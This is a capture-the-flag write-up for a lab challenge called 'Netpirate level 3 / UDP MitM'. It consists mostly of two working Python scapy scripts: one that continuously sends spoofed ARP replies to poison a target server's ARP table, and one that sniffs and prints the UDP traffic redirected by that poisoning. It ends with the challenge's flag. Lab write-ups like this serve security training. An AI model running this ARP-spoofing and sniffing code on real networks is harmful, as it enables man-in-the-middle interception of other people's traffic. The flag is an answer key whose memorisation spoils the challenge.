# Netpirate level 3 / UDP MitM

**Author:** [KptCheeseWhiz](https://github.com/KptCheeseWhiz)

## Write-up

### Terminal 1

Poison the ARP table of the server1 to receive the traffic for server2.

```python
from scapy.all import *
from time import sleep

def system(cmd):
  from os import popen
  with popen(f"{cmd} 2>&1") as p:
    return p.read().strip()

hwaddr_entrypoint=get_if_hwaddr("eth0")

# Retreive IP addresses of server1 and server2
ipaddr_server1, ipaddr_server2=system("getent hosts server1 server2 | awk '{print $1}'").split("\n")

def arp_spoof(ip_target, ip_spoof, hw_attacker):
  send(
    ARP(
      op=2,
      pdst=ip_target,
      psrc=ip_spoof,
      hwdst=hw_attacker
    ), verbose=0
  )

print("[*] Sending spoofed ARP packets")
while True:
  arp_spoof(
    ip_target=ipaddr_server1,
    ip_spoof=ipaddr_server2,
    hw_attacker=hwaddr_entrypoint
  )
  print(".", end="", flush=True)
  sleep(1)
```

### Terminal 2

Listen all UDP traffic to receive the flag, no need to forward the traffic (yet).

```python
from scapy.all import *

# Print the data contained in UDP packets
def sniff_udp(packet):
  print(f"[+] {packet[Raw].load.decode().strip()}")

print(f"[*] Listening for UDP packets")
sniff(
  prn=sniff_udp,
  filter="udp",
  store=False
)
```

## Flag

`flag-12ec5c6dcb790868b67e8ed15dac2122f462f1f88b290fb04ef3778bdb2a9d83`
